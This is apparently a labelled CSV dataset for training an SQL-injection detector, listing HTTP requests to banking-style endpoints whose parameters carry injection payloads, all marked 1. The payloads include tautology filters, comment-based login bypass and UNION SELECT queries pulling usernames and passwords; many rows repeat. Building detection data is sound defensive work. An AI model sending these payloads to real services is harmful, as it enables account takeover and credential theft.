payload,label
GET /transactions/history?account_id=2' OR 1=1 -- HTTP/1.1,1
"GET /payments?payment_id=3' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /users/profile?user_id=1' -- HTTP/1.1,1
GET /account/history?account_number=100' OR '1'='1' -- HTTP/1.1,1
GET /loan/application?loan_id=4' OR '1'='1' -- HTTP/1.1,1
POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
POST /account/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=new_user' OR '1'='1' --&password=1234,1
"POST /transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&amount=500",1
"POST /payment HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""amount\"":\""1000' OR '1'='1' --\""}",1
"POST /loan/apply HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""amount\"":\""10000' UNION SELECT null, username, password FROM users --\""}",1
"POST /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""email\"":\""admin' OR 1=1 --@domain.com\""}",1
POST /transaction/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' OR '1'='1' --&amount=1000,1
"POST /account/update HTTP/1.1\nContent-Type: application/json\n{\""account_number\"":1234,\""balance\"":\""1000' OR 1=1 --\""}",1
"POST /withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=100' UNION SELECT null, username, password FROM users --&amount=200",1
POST /deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1002' AND 1=1 --&amount=500,1
"POST /payment/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678",1
POST /user/signup HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=admin,1
POST /account/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1' AND 1=1 --&action=delete,1
"POST /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1' UNION SELECT null, username, password FROM users --&status=completed",1
POST /loan/details HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' OR '1'='1' --&action=update,1
"POST /card/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncard_id=1' UNION SELECT null, username, password FROM users --&expiry_date=12/24",1
"POST /user/transaction HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""transaction_id\"":\""100' OR 1=1 --\"",\""amount\"":200}",1
"POST /deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' UNION SELECT null, username, password FROM users --&amount=200",1
"POST /loan/payment HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":5,\""amount\"":\""1000' OR 1=1 --\""}",1
POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' AND 1=1 --&address=NYC,1
POST /transaction/withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1234' OR '1'='1' --&amount=100,1
"POST /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678",1
"POST /account/statement HTTP/1.1\nContent-Type: application/json\n{\""account_number\"":1234,\""statement_date\"":\""2022-01-01' OR '1'='1' --\""}",1
"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' --\"",\""password\"":\""1234\""}",1
POST /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' AND 1=1 --&amount=1000,1
"PUT /account/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1001' UNION SELECT null, username, password FROM users --&balance=5000",1
"PUT /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""email\"":\""admin' OR 1=1 --@domain.com\"",\""phone\"":\""1234567890\""}",1
PUT /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1' OR '1'='1' --&status=completed,1
"PUT /loan/update HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":1,\""status\"":\""approved' OR 1=1 --\""}",1
PUT /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' AND 1=1 --&amount=2000,1
PUT /user/settings HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR '1'='1' --&theme=dark,1
PUT /transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1001' AND 1=1 --&amount=100,1
"PUT /account HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1234' UNION SELECT null, username, password FROM users --&balance=2000",1
"PUT /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' UNION SELECT null, username, password FROM users --&address=LA",1
"PUT /loan/payment HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":10,\""amount\"":\""2000' OR 1=1 --\""}",1
"PUT /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678",1
PUT /account/deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1' AND 1=1 --&amount=500,1
"PUT /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":2,\""email\"":\""user@domain.com' OR '1'='1' --\""}",1
PUT /transaction/status HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' AND 1=1 --&status=completed,1
"DELETE /account/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /transaction/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1' OR '1'='1' --&action=delete,1
"DELETE /user/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /loan/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' AND 1=1 --&action=delete,1
"DELETE /payment/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=5' UNION SELECT null, username, password FROM users --&action=delete",1
"DELETE /account HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=100' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /profile/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' AND '1'='1' --&action=delete,1
"DELETE /transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' OR '1'='1' --&action=delete,1
"DELETE /loan HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=10' AND 1=1 --&action=delete,1
"DELETE /account/statement HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nstatement_id=2' UNION SELECT null, username, password FROM users --&action=delete",1
"DELETE /customer/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncustomer_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
"DELETE /transaction/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=15' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /account/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1' AND 1=1 --&action=delete,1
DELETE /payment/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=4' OR 1=1 --&action=delete,1
"PATCH /account/update HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""balance\"":\""5000' OR 1=1 --\""}",1
"PATCH /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=10' UNION SELECT null, username, password FROM users --&status=approved",1
PATCH /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=2' AND 1=1 --&amount=200,1
"PATCH /profile/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""phone\"":\""9876543210' UNION SELECT null, username, password FROM users --\""}",1
"PATCH /loan/update HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":1,\""status\"":\""approved' OR 1=1 --\""}",1
PATCH /transaction/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' AND 1=1 --&status=completed,1
"PATCH /payment HTTP/1.1\nContent-Type: application/json\n{\""payment_id\"":1,\""status\"":\""completed' OR 1=1 --\""}",1
PATCH /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=1' AND 1=1 --&status=completed,1
"PATCH /account/settings HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""theme\"":\""dark' OR 1=1 --\""}",1
"PATCH /loan/payment HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":2,\""amount\"":\""200' OR 1=1 --\""}",1
"PATCH /transaction/status HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=500' UNION SELECT null, username, password FROM users --&status=completed",1
"PATCH /user/settings HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""language\"":\""en' OR 1=1 --\""}",1
GET /account/details?account_number=12345' OR '1'='1' -- HTTP/1.1,1
"GET /transfer/history?user_id=1001' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /transactions?account_id=2' AND '1'='1' -- HTTP/1.1,1
GET /balance?user_id=1234' AND '1'='1' -- HTTP/1.1,1
GET /login?username=admin' OR 1=1 -- HTTP/1.1,1
GET /user/transactions?user_id=1' AND 1=1 -- HTTP/1.1,1
"GET /user/loan?loan_id=7' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer?sender_account=1234' OR '1'='1' -- HTTP/1.1,1
GET /account/overview?account_number=9876' AND '1'='1' -- HTTP/1.1,1
GET /user/profile?user_id=1' OR '1'='1' -- HTTP/1.1,1
GET /search?query=loan' HAVING 1=1 -- HTTP/1.1,1
"GET /transactions/history?account_id=789' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /user/details?user_id=3' OR '1'='1' -- HTTP/1.1,1
"GET /account/statement?account_number=2345' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /profile?user_id=10' AND '1'='1' -- HTTP/1.1,1
GET /search?keyword=balance' HAVING 1=1 -- HTTP/1.1,1
GET /payment/details?payment_id=8' OR '1'='1' -- HTTP/1.1,1
GET /account/transactions?account_number=456' OR '1'='1' -- HTTP/1.1,1
GET /loan/repayment?loan_id=4' OR '1'='1' -- HTTP/1.1,1
"GET /payments?payment_id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /card/details?card_id=1111' OR '1'='1' -- HTTP/1.1,1
GET /customer/details?customer_id=7' OR '1'='1' -- HTTP/1.1,1
"GET /user/loan/status?loan_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /transfer?user_id=2' AND '1'='1' -- HTTP/1.1,1
"GET /transaction/status?transaction_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account/history?account_number=333' OR '1'='1' -- HTTP/1.1,1
POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
"POST /transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&amount=500",1
"POST /payment HTTP/1.1\nContent-Type: application/json\n{\""payment_id\"":5,\""amount\"":\""1000' OR '1'='1' --\""}",1
"POST /loan/request HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' UNION SELECT null, username, password FROM users --&amount=2000",1
POST /account/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1001' AND 1=1 --&balance=5000,1
POST /user/signup HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=new_user' OR '1'='1' --&password=secret,1
POST /transaction/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' AND 1=1 --&amount=1000,1
"POST /loan/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' UNION SELECT null, username, password FROM users --&status=approved",1
"POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' UNION SELECT null, username, password FROM users --&email=user@domain.com",1
POST /withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1234' AND 1=1 --&amount=500,1
POST /account/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=new_user' OR '1'='1' --&password=admin123,1
"POST /deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=100' UNION SELECT null, username, password FROM users --&amount=200",1
"POST /transfer/verify HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=100' UNION SELECT null, username, password FROM users --&receiver_account=500&amount=200",1
POST /payment/transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=5' AND '1'='1' --&amount=1500,1
"POST /account/statement HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' UNION SELECT null, username, password FROM users --&date_range=2022-01-01",1
"POST /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678&amount=1000",1
"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' --\"",\""password\"":\""password\""}",1
"POST /loan/approve HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=1' UNION SELECT null, username, password FROM users --&status=approved",1
"POST /transaction/withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' UNION SELECT null, username, password FROM users --&amount=500",1
"POST /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=5' UNION SELECT null, username, password FROM users --&status=completed",1
POST /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=3' AND 1=1 --&status=approved,1
"PUT /account/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1001' UNION SELECT null, username, password FROM users --&balance=1000",1
PUT /loan/approve HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=2' AND '1'='1' --&status=approved,1
"PUT /user/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=3' UNION SELECT null, username, password FROM users --&phone=1234567890",1
PUT /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=8' AND 1=1 --&amount=1000,1
"PUT /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=7' UNION SELECT null, username, password FROM users --&status=completed",1
"PUT /card/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncard_id=11' UNION SELECT null, username, password FROM users --&expiry_date=12/24",1
PUT /transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' AND '1'='1' --&status=completed,1
"PUT /user/settings HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""language\"":\""en' OR 1=1 --\""}",1
"PUT /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=5' UNION SELECT null, username, password FROM users --&status=completed",1
PUT /transaction/status HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=50' AND '1'='1' --&status=completed,1
"PUT /loan/payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' UNION SELECT null, username, password FROM users --&amount=5000",1
PUT /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=10' AND 1=1 --&status=completed,1
"PUT /account/settings HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""theme\"":\""dark' OR 1=1 --\""}",1
"DELETE /account/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /transaction/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=5' OR '1'='1' --&action=delete,1
"DELETE /user/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=3' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /payment/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=8' AND 1=1 --&action=delete,1
"DELETE /loan/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /card/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncard_id=100' AND 1=1 --&action=delete,1
"DELETE /account HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=2000' UNION SELECT null, username, password FROM users --&action=delete",1
"DELETE /payment/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
"DELETE /transaction/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=2' UNION SELECT null, username, password FROM users --&action=delete",1
DELETE /user/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=10' AND 1=1 --&action=delete,1
"DELETE /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=1' UNION SELECT null, username, password FROM users --&",1
GET /bank/loan/status?loan_number=999' OR 1=1 -- HTTP/1.1,1
"GET /customer/account?account_id=7890' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /balance/summary?customer_id=2345' AND '1'='1' -- HTTP/1.1,1
"GET /account/overview?account_number=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /withdrawal/details?transaction_id=4567' AND '1'='1' -- HTTP/1.1,1
GET /transfer/funds?from_account=10001' OR '1'='1' -- HTTP/1.1,1
GET /payment/status?payment_reference=abc123' AND '1'='1' -- HTTP/1.1,1
"GET /transactions/history?account_id=2222' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /user/transactions?user_id=11' OR '1'='1' -- HTTP/1.1,1
GET /customer/info?customer_id=567' AND '1'='1' -- HTTP/1.1,1
"GET /loan/repayment?loan_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer?from_account=12121' OR '1'='1' -- HTTP/1.1,1
GET /transaction/details?transaction_id=9' AND '1'='1' -- HTTP/1.1,1
"GET /user/loan/status?user_id=18' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/details?payment_id=44' AND '1'='1' -- HTTP/1.1,1
GET /user/update/details?user_id=300' OR '1'='1' -- HTTP/1.1,1
"GET /card/status?card_number=8765' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account/funds?account_id=4' AND '1'='1' -- HTTP/1.1,1
"GET /customer/transactions?customer_id=556' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/verify?payment_id=20' AND '1'='1' -- HTTP/1.1,1
GET /withdrawal/confirmation?transaction_id=15' OR '1'='1' -- HTTP/1.1,1
"GET /loan/lookup?loan_id=7' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer/verify?transfer_id=900' AND '1'='1' -- HTTP/1.1,1
"GET /user/details?user_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /card/lookup?card_id=890' AND '1'='1' -- HTTP/1.1,1
"GET /account/transactions?account_number=1005' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/update?payment_id=72' AND '1'='1' -- HTTP/1.1,1
"GET /loan/applications?loan_type=personal' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account/funds/status?account_id=3000' OR '1'='1' -- HTTP/1.1,1
GET /bank/loan/status?loan_number=999' OR 1=1 -- HTTP/1.1,1
"GET /customer/account?account_id=7890' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /balance/summary?customer_id=2345' AND '1'='1' -- HTTP/1.1,1
"GET /account/overview?account_number=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /withdrawal/details?transaction_id=4567' AND '1'='1' -- HTTP/1.1,1
GET /transfer/funds?from_account=10001' OR '1'='1' -- HTTP/1.1,1
GET /payment/status?payment_reference=abc123' AND '1'='1' -- HTTP/1.1,1
"GET /transactions/history?account_id=2222' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /user/transactions?user_id=11' OR '1'='1' -- HTTP/1.1,1
GET /customer/info?customer_id=567' AND '1'='1' -- HTTP/1.1,1
"GET /loan/repayment?loan_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer?from_account=12121' OR '1'='1' -- HTTP/1.1,1
GET /transaction/details?transaction_id=9' AND '1'='1' -- HTTP/1.1,1
"GET /user/loan/status?user_id=18' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/details?payment_id=44' AND '1'='1' -- HTTP/1.1,1
GET /user/update/details?user_id=300' OR '1'='1' -- HTTP/1.1,1
"GET /card/status?card_number=8765' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account/funds?account_id=4' AND '1'='1' -- HTTP/1.1,1
"GET /customer/transactions?customer_id=556' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/verify?payment_id=20' AND '1'='1' -- HTTP/1.1,1
GET /withdrawal/confirmation?transaction_id=15' OR '1'='1' -- HTTP/1.1,1
"GET /loan/lookup?loan_id=7' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer/verify?transfer_id=900' AND '1'='1' -- HTTP/1.1,1
"GET /user/details?user_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /card/lookup?card_id=890' AND '1'='1' -- HTTP/1.1,1
"GET /account/transactions?account_number=1005' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/update?payment_id=72' AND '1'='1' -- HTTP/1.1,1
"GET /loan/applications?loan_type=personal' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account/funds/status?account_id=3000' OR '1'='1' -- HTTP/1.1,1
"PUT /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=112233' UNION SELECT null, username, password FROM users --&balance=5000",1
PUT /loan/update HTTP/1.1\nContent-Type: application/json\nloan_id=4455' AND '1'='1' --&status=approved,1
PUT /user/settings HTTP/1.1\nContent-Type: application/json\nuser_id=7890' OR '1'='1' --&notification=true,1
"PUT /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=7890' UNION SELECT null, username, password FROM users --&status=completed",1
PUT /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=12345' AND '1'='1' --&amount=1500,1
"PUT /account/modify HTTP/1.1\nContent-Type: application/json\naccount_id=11111' UNION SELECT null, username, password FROM users --&account_type=savings",1
PUT /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=1234' OR '1'='1' --&name=NewUserName,1
"PUT /loan/modify HTTP/1.1\nContent-Type: application/json\nloan_id=500' UNION SELECT null, username, password FROM users --&amount=15000",1
PUT /funds/update HTTP/1.1\nContent-Type: application/json\naccount_id=2233' AND '1'='1' --&funds=2000,1
"PUT /card/modify HTTP/1.1\nContent-Type: application/json\ncard_id=9012' UNION SELECT null, username, password FROM users --&expiry_date=12/25",1
PUT /payment/modify HTTP/1.1\nContent-Type: application/json\npayment_id=3546' AND '1'='1' --&status=cancelled,1
PUT /transaction/status HTTP/1.1\nContent-Type: application/json\ntransaction_id=1234' OR '1'='1' --&status=failed,1
"PUT /customer/update HTTP/1.1\nContent-Type: application/json\ncustomer_id=4567' UNION SELECT null, username, password FROM users --&address=NewStreet",1
PUT /user/modify HTTP/1.1\nContent-Type: application/json\nuser_id=8910' AND '1'='1' --&password=newpass,1
"PUT /loan/request HTTP/1.1\nContent-Type: application/json\nloan_id=768' UNION SELECT null, username, password FROM users --&amount=5000",1
DELETE /account/remove HTTP/1.1\nContent-Type: application/json\naccount_id=1002' OR '1'='1' --&confirm=true,1
"DELETE /loan/cancel HTTP/1.1\nContent-Type: application/json\nloan_id=345' UNION SELECT null, username, password FROM users --&reason=change_of_plan",1
DELETE /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=456' AND '1'='1' --&reason=error,1
"DELETE /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_id=999' UNION SELECT null, username, password FROM users --&reason=duplicate",1
DELETE /card/delete HTTP/1.1\nContent-Type: application/json\ncard_id=1111' AND '1'='1' --&reason=lost,1
"DELETE /user/remove HTTP/1.1\nContent-Type: application/json\nuser_id=2222' UNION SELECT null, username, password FROM users --&confirm=true",1
DELETE /funds/remove HTTP/1.1\nContent-Type: application/json\nfund_id=555' OR '1'='1' --&reason=overwithdrawal,1
"DELETE /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=1005' UNION SELECT null, username, password FROM users --&reason=inactive",1
DELETE /payment/remove HTTP/1.1\nContent-Type: application/json\npayment_id=3333' AND '1'='1' --&reason=fraud,1
"DELETE /loan/terminate HTTP/1.1\nContent-Type: application/json\nloan_id=6666' UNION SELECT null, username, password FROM users --&reason=paid_off",1
DELETE /transaction/delete HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND '1'='1' --&reason=duplicate,1
"DELETE /user/deactivate HTTP/1.1\nContent-Type: application/json\nuser_id=888' UNION SELECT null, username, password FROM users --&confirm=true",1
DELETE /payment/delete HTTP/1.1\nContent-Type: application/json\npayment_id=112' AND '1'='1' --&reason=error,1
"DELETE /card/remove HTTP/1.1\nContent-Type: application/json\ncard_id=900' UNION SELECT null, username, password FROM users --&reason=theft",1
DELETE /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=1010' OR '1'='1' --&reason=wrong_amount,1
"DELETE /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=9999' UNION SELECT null, username, password FROM users --&reason=system_error",1
GET /account/balance?account_id=12345' OR 1=1 -- HTTP/1.1,1
"GET /user/details?user_id=1001' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /transactions/history?account_id=54321' AND '1'='1' -- HTTP/1.1,1
GET /login?username=admin' OR '1'='1' -- HTTP/1.1,1
"GET /account/overview?account_number=99999' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/history?payment_id=456' AND '1'='1' -- HTTP/1.1,1
GET /transfer/history?from_account=2345' OR '1'='1' -- HTTP/1.1,1
GET /user/profile?user_id=5432' AND '1'='1' -- HTTP/1.1,1
"GET /account/statement?account_id=67890' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /loan/details?loan_id=321' AND '1'='1' -- HTTP/1.1,1
GET /search/loan?amount=5000' OR '1'='1' -- HTTP/1.1,1
"GET /customer/lookup?customer_id=200' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /transaction/status?transaction_id=6000' AND '1'='1' -- HTTP/1.1,1
"GET /user/transactions?user_id=400' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /account/transactions?account_number=11111' AND '1'='1' -- HTTP/1.1,1
"GET /loan/status?loan_id=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /funds/transfer?account_id=2222' AND '1'='1' -- HTTP/1.1,1
"GET /card/details?card_number=5555' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
GET /payment/status?payment_ref=abcdef' AND '1'='1' -- HTTP/1.1,1
"GET /account/deposit?account_id=3000' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
